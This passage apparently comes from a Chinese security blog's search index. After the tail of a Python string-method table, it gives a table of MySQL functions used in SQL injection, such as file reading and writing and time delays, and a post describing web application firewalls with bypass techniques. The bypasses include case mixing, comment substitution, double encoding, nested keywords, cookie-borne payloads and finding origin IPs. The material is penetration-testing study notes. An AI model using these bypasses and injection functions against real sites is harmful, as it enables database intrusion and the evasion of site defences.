指定的编码格式对字符串进行编码。</td></tr><tr><td>endswith(sub[, start[, end]])</td><td>检查字符串是否以 sub 子字符串结束，如果是返回 True，否则返回 False。start 和 end 参数表示范围，可选。</td></tr><tr><td>expandtabs([tabsize=8])</td><td>把字符串中的 tab 符号（\t）转换为空格，如不指定参数，默认的空格数是 tabsize=8。</td></tr><tr><td>find(sub[, start[, end]])</td><td>检测 sub 是否包含在字符串中，如果有则返回索引值，否则返回 -1，start 和 end 参数表示范围，可选。</td></tr><tr><td>index(sub[, start[, end]])</td><td>跟 find 方法一样，不过如果 sub 不在 string 中会产生一个异常。</td></tr><tr><td>isalnum()</td><td>如果字符串至少有一个字符并且所有字符都是字母或数字则返回 True，否则返回 False。</td></tr><tr><td>isalpha()</td><td>如果字符串至少有一个字符并且所有字符都是字母则返回 True，否则返回 False。</td></tr><tr><td>isdecimal()</td><td>如果字符串只包含十进制数字则返回 True，否则返回 False。</td></tr><tr><td>isdigit()</td><td>如果字符串只包含数字则返回 True，否则返回 False。</td></tr><tr><td>islower()</td><td>如果字符串中至少包含一个区分大小写的字符，并且这些字符都是小写，则返回 True，否则返回 False。</td></tr><tr><td>isnumeric()</td><td>如果字符串中只包含数字字符，则返回 True，否则返回 False。</td></tr><tr><td>isspace()</td><td>如果字符串中只包含空格，则返回 True，否则返回 False。</td></tr><tr><td>istitle()</td><td>如果字符串是标题化（所有的单词都是以大写开始，其余字母均小写），则返回 True，否则返回 False。</td></tr><tr><td>isupper()</td><td>如果字符串中至少包含一个区分大小写的字符，并且这些字符都是大写，则返回 True，否则返回 False。</td></tr><tr><td>join(sub)</td><td>以字符串作为分隔符，插入到 sub 中所有的字符之间。</td></tr><tr><td>ljust(width)</td><td>返回一个左对齐的字符串，并使用空格填充至长度为 width 的新字符串。</td></tr><tr><td>lower()</td><td>转换字符串中所有大写字符为小写。</td></tr><tr><td>lstrip()</td><td>去掉字符串左边的所有空格</td></tr><tr><td>partition(sub)</td><td>找到子字符串 sub，把字符串分成一个 3 元组 (pre_sub, sub, fol_sub)，如果字符串中不包含 sub 则返回 (‘原字符串’, ‘’, ‘’)</td></tr><tr><td>replace(old, new[, count])</td><td>把字符串中的 old 子字符串替换成 new 子字符串，如果 count 指定，则替换不超过 count 次。</td></tr><tr><td>rfind(sub[, start[, end]])</td><td>类似于 find() 方法，不过是从右边开始查找。</td></tr><tr><td>rindex(sub[, start[, end]])</td><td>类似于 index() 方法，不过是从右边开始。</td></tr><tr><td>rjust(width)</td><td>返回一个右对齐的字符串，并使用空格填充至长度为 width 的新字符串。</td></tr><tr><td>rpartition(sub)</td><td>类似于 partition() 方法，不过是从右边开始查找。</td></tr><tr><td>rstrip()</td><td>删除字符串末尾的空格。</td></tr><tr><td>split(sep=None, maxsplit=-1)</td><td>不带参数默认是以空格为分隔符切片字符串，如果 maxsplit 参数有设置，则仅分隔 maxsplit 个子字符串，返回切片后的子字符串拼接的列表。</td></tr><tr><td>splitlines(([keepends]))</td><td>在输出结果里是否去掉换行符，默认为 False，不包含换行符；如果为 True，则保留换行符。。</td></tr><tr><td>startswith(prefix[, start[, end]])</td><td>检查字符串是否以 prefix 开头，是则返回 True，否则返回 False。start 和 end 参数可以指定范围检查，可选。</td></tr><tr><td>strip([chars])</td><td>删除字符串前边和后边所有的空格，chars 参数可以定制删除的字符，可选。</td></tr><tr><td>swapcase()</td><td>翻转字符串中的大小写。</td></tr><tr><td>title()</td><td>返回标题化（所有的单词都是以大写开始，其余字母均小写）的字符串。</td></tr><tr><td>translate(table)</td><td>根据 table 的规则（可以由 str.maketrans(‘a’, ‘b’) 定制）转换字符串中的字符。</td></tr><tr><td>upper()</td><td>转换字符串中的所有小写字符为大写。</td></tr><tr><td>zfill(width)</td><td>返回长度为 width 的字符串，原字符串右对齐，前边用 0 填充。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入常用函数及逻辑运算</title>
      <link href="/2019/10/23/mysqlzhurufun/"/>
      <url>/2019/10/23/mysqlzhurufun/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL注入常用函数："><a href="#MySQL注入常用函数：" class="headerlink" title="MySQL注入常用函数："></a>MySQL注入常用函数：</h1><table><thead><tr><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>system_user()</td><td>系统用户名</td></tr><tr><td>user()</td><td>用户名</td></tr><tr><td>current_user()</td><td>当前用户名</td></tr><tr><td>session_user()</td><td>连接数据库的用户名</td></tr><tr><td>database()</td><td>数据库名</td></tr><tr><td>version()</td><td>数据库版本</td></tr><tr><td>@@datadir</td><td>数据库路径</td></tr><tr><td>@@basedir</td><td>数据库安装路径</td></tr><tr><td>@@version_compile_os</td><td>操作系统</td></tr><tr><td>count()</td><td>返回执行结果数量········</td></tr><tr><td>concat()</td><td>没有分隔符的连接字符串</td></tr><tr><td>concat_ws()</td><td>含有分隔符的连接字符串</td></tr><tr><td>group_concat</td><td>连接一个组的所有字符串，并以逗号分隔每一条数据</td></tr><tr><td>load_file()</td><td>读取本地文件</td></tr><tr><td>into outfile</td><td>写文件</td></tr><tr><td>ascii()</td><td>字符串的ASCII代码值</td></tr><tr><td>ord()</td><td>返回字符串第一个字符的ACSCII值</td></tr><tr><td>mid()</td><td>返回一个字符串的一部分</td></tr><tr><td>substr()</td><td>返回一个字符串的一部分</td></tr><tr><td>length()</td><td>返回字符串的长度</td></tr><tr><td>left()</td><td>返回字符串的最左边几个字符</td></tr><tr><td>floor</td><td>返回小于或等于x的最大整数</td></tr><tr><td>rand</td><td>返回0和1之间的随机数</td></tr><tr><td>extractvalue()</td><td>第一个参数：XML document是String格式，为XML文档对象的名称，文中为Doc   第二个参数：XPath string（Xpath格式的字符串）  作用：从目标XML中返回包含所查询值的字符串</td></tr><tr><td>updatexml()</td><td>第一个参数：XML document是String格式，为XML文档对象的名称，文中为Doc   第二个参数：XPath string（Xpath格式的字符串） 第三个参数：new value String格式，替换查找到的符合条件的数据        作用：改变文档中符合条件的节点的值</td></tr><tr><td>sleep()</td><td>让此语句运行N秒钟</td></tr><tr><td>if()</td><td>SELECT IF(1&gt;2.2.3) -&gt; 3 类似三目运算</td></tr><tr><td>char()</td><td>返回整数ASCII代码字符组成的字符串</td></tr><tr><td>STRCMP()</td><td>比较字符串内容</td></tr><tr><td>IFNULL()</td><td>假如参数1不为NUL,则返回值为参数1,否则其返回值为参数2</td></tr><tr><td>exp()</td><td>返回e的x次方</td></tr></tbody></table><h1 id="MySQL运算符"><a href="#MySQL运算符" class="headerlink" title="MySQL运算符"></a>MySQL运算符</h1><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><table><thead><tr><th>符号</th><th>作用</th><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>+</td><td>加法运算</td><td>%</td><td>求余运算</td></tr><tr><td>-</td><td>减法运算</td><td>DIV</td><td>除法运算</td></tr><tr><td>*</td><td>乘法运算</td><td>MOD</td><td>求余运算，同“/”</td></tr><tr><td>/</td><td>除法运算</td><td></td><td></td></tr></tbody></table><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><table><thead><tr><th>符号</th><th>作用</th><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>&gt;</td><td>大于</td><td>IS NOT NULL</td><td>不为空</td></tr><tr><td>&lt;</td><td>小于</td><td>BETWEEN AND</td><td>在…之间</td></tr><tr><td>=</td><td>等于</td><td>IN</td><td>包含</td></tr><tr><td>&gt;=</td><td>大于等于</td><td>NOT IN</td><td>不包含</td></tr><tr><td>&lt;=</td><td>小于等于</td><td>LIKE</td><td>模式匹配</td></tr><tr><td>!=或&lt;&gt;</td><td>不等于</td><td>NOT LIKE</td><td>模式匹配</td></tr><tr><td>IS NULL</td><td>为空</td><td>REGEXP</td><td>正则表达式</td></tr></tbody></table><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><table><thead><tr><th>符号</th><th>作用</th><th>符号</th><th>作用</th><th></th></tr></thead><tbody><tr><td>&amp;&amp;或AND</td><td>与</td><td>!或NOT</td><td>非</td><td></td></tr><tr><td>||或OR</td><td>或</td><td>XOR</td><td>异或</td><td></td></tr></tbody></table><blockquote><p>参考： <a href="https://mooc.study.163.com/smartSpec/detail/1001386007.htm" target="_blank" rel="noopener" title="With a Title">web安全工程师（进阶）-网易云课堂</a>. </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注入 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WAF介绍及常见绕过方法</title>
      <link href="/2019/10/23/wafjieshao/"/>
      <url>/2019/10/23/wafjieshao/</url>
      
        <content type="html"><![CDATA[<h1 id="一、WAF简介"><a href="#一、WAF简介" class="headerlink" title="一、WAF简介"></a>一、WAF简介</h1><p>   WAF(WebApplicationFirewall)也称：网站应用级入侵防御系统，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><h2 id="1-工作原理"><a href="#1-工作原理" class="headerlink" title="1.工作原理"></a>1.工作原理</h2><p>   对web应用程序客户端发出的流量进行内容检测和验证，检测其安全性与合法性，来屏蔽常见的网站漏洞攻击，如SQL注入，XML注入、XSS等。</p><h2 id="2-WAF分类"><a href="#2-WAF分类" class="headerlink" title="2.WAF分类"></a>2.WAF分类</h2><h3 id="软件型WAF"><a href="#软件型WAF" class="headerlink" title="软件型WAF"></a>软件型WAF</h3><p>  以软件形式装在所保护的服务器上的WAF，由于安装在服务器上，所以可以接触到服务器上的文件，直接检测服务器上是否存在WebShell是否有文件被创建等。代表性的产品有：安全狗，D盾。</p><h3 id="硬件型WAF"><a href="#硬件型WAF" class="headerlink" title="硬件型WAF"></a>硬件型WAF</h3><p>  以硬件形式部署再链路中，支持多种部署方式，当串联到链路中时可以拦截恶意流量，在旁路监听模式时只记录攻击不进行拦截。代表性的产品有：nsfocus， imperva硬件。</p><h3 id="云WAF"><a href="#云WAF" class="headerlink" title="云WAF"></a>云WAF</h3><p>  一般以反向代理的形式工作，通过配置NS记录或CNAME记录，使对网站的请求报文优先经过WAF主机，经过WAF主机过滤后，将认为无害的请求报文再发生给实际网站服务器进行请求，可以说是戴防护功能的CDN。代表性的产品有：百度云加速，阿里云云盾。</p><h3 id="网站系统内置的WAF"><a href="#网站系统内置的WAF" class="headerlink" title="网站系统内置的WAF"></a>网站系统内置的WAF</h3><p>  网站系统内置的WAF也可以说是网站系统中内置的过滤，直接镶嵌在代码中，相对来说自由度高一般有以下这几种情况。</p><ul><li><p>输入参数强制类型转换（intval等）。</p></li><li><p>输入参数合法性检测。</p></li><li><p>关键函数执行（SQL执行、页面显示、命令执行等）前，对经过流程的输入进行检测。</p></li><li><p>对输入的数据进行替换过滤后再继续执行代码流程（转义/替换掉特殊字符等）。</p><p>网站系统内置的WAF与业务更加锲合，在对安全与业务都比较了解的情况下，可以更少的收到误报与漏报。</p></li></ul><h1 id="二、一些WAF绕过方法（以注入为主）"><a href="#二、一些WAF绕过方法（以注入为主）" class="headerlink" title="二、一些WAF绕过方法（以注入为主）"></a>二、一些WAF绕过方法（以注入为主）</h1><h2 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h2><p>比如waf拦截<code>union select</code>，可以构造<code>Union sElEcT</code>来绕过。</p><h2 id="2-特殊字符替换空格或注释绕过"><a href="#2-特殊字符替换空格或注释绕过" class="headerlink" title="2.特殊字符替换空格或注释绕过"></a>2.特殊字符替换空格或注释绕过</h2><p>可以用注释来替代空格进行绕过，有些waf在检测时不会识别注释或者将注释替换掉，如sqlserver中可以用/<em><em>/代替空格，在mysql中 %0a 是换行，可以代替空格。<br>如<code>union select 1,2</code>可转换为`union/</em>xx</em>/select/<em>xx</em>/1,2`</p><h2 id="3-编码绕过"><a href="#3-编码绕过" class="headerlink" title="3.编码绕过"></a>3.编码绕过</h2><p>少数waf不会对普通字符进行URL解码,还有一部分waf只会进行一次url解码，所以可以对payload进行二次url编码。常见的SQL编码有unicode、HEX、URL、ascll、base64等，XSS编码有：HTML、URL、ASCII、JS编码、base64等等。<br>如 <code>union select 1,2</code>可对其进行url编码后进行绕过waf。</p><h2 id="4-关键字替换绕过"><a href="#4-关键字替换绕过" class="headerlink" title="4.关键字替换绕过"></a>4.关键字替换绕过</h2><p>有些WAF会删除或者替换关键字，如遇到select union等敏感字词。<br>如 <code>union select 1,2,3</code>可替换为<code>ununionion selselectect 1,,2,3</code></p><h2 id="5-多请求拆分绕过"><a href="#5-多请求拆分绕过" class="headerlink" title="5.多请求拆分绕过"></a>5.多请求拆分绕过</h2><p>对于多个参数的语句，可以将注入语句分割插入。<br>如这样的请求：<code>?a=[inputa]&amp;b=[inputb]</code>可将参数a和b拼接如：<code>and a=[inputa] and b=[inputb]</code></p><h2 id="6-利用cookies绕过"><a href="#6-利用cookies绕过" class="headerlink" title="6.利用cookies绕过"></a>6.利用cookies绕过</h2><p>对于用了$_REQUEST来获取参数的网站可以尝试将payload放在cookie中进行绕过REQUEST会依次从GET POST cookie中获取参数，如果WAF只检测了GET/POST而没有检测cookie，可以将语句放在cookie中进行绕过。</p><h2 id="7-云WAF绕过之寻找网站源ip"><a href="#7-云WAF绕过之寻找网站源ip" class="headerlink" title="7.云WAF绕过之寻找网站源ip"></a>7.云WAF绕过之寻找网站源ip</h2><p>采用云WAF的网站可以寻找网站真实ip来绕过云WAF的检测。<br>常见方法有：</p><ul><li>采用多地ping的方法查看ip地址解析分析真实ip<br>在线ping网站有：<br><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a></li><li>使用 nslookup 进行检测，原理同上。</li><li>寻找网站历史解析记录。</li><li>找网站的二级域名、NS、MX记录等对应的ip。</li><li>订阅网站邮件，查看邮件发送方的ip。</li></ul><hr><p>参考：《WEB渗透测试实战指南》</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> WAF </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
